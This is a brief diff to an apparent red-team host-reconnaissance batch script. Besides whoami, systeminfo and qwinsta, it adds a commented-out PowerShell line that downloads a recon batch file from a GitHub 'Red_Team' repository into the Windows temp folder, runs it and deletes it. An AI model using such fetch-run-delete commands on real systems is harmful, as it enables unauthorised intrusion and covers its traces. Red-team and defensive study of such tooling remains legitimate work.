@@ -1,3 +1,5 @@
+rem powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Easy.bat -o C:\Windows\Temp\Host_Recon_Easy.bat;C:\Windows\Temp\Host_Recon_Easy.bat;del C:\Windows\Temp\Host_Recon_Easy.bat"
+
 whoami
 systeminfo
 qwinsta
